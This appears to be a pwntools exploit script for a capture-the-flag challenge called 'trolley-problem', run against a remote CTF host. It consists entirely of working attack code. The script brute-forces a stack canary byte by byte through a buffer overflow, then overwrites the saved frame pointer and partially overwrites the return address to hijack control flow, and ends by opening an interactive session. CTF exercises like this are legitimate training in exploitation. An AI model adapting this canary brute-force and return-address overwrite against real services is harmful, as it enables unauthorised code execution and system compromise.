from pwn import *

context.binary = elf = ELF('./chall')

# pr = process()
pr = remote('trolley-problem.harkonnen.b01lersc.tf', 8443,ssl=True)

for i in range(1000):
    print(f'Run:{i}')
    pr.recvuntil(b'What do you do?')
    pr.sendline(b'a')
    # pr.interactive()

canary = b'\x00'

payload = b'A'* 0x18 #buffer
for i in range(7):
    print(f'Finding canary byte {i}')
    for j in range(256):
        print(f'Trying j={j}')
        if j==10:
            continue
        pr.recvuntil(b'What do you do?')
        # payload+= canary + j.to_bytes(1,'little') #canary
        pr.sendline(payload+canary+j.to_bytes(1,'little'))
        pr.recvuntil(b'though?\n')
        ln = pr.recvline()
        if b'stack smashing' not in ln:
            print(f'found canary: {canary + j.to_bytes(1,"little")}')
            canary += j.to_bytes(1,'little')
            break

pr.recvuntil(b'What do you do?')
pr.sendline(payload+canary+b'SAVEDRBP'+b'\xd6') #canary
pr.interactive()
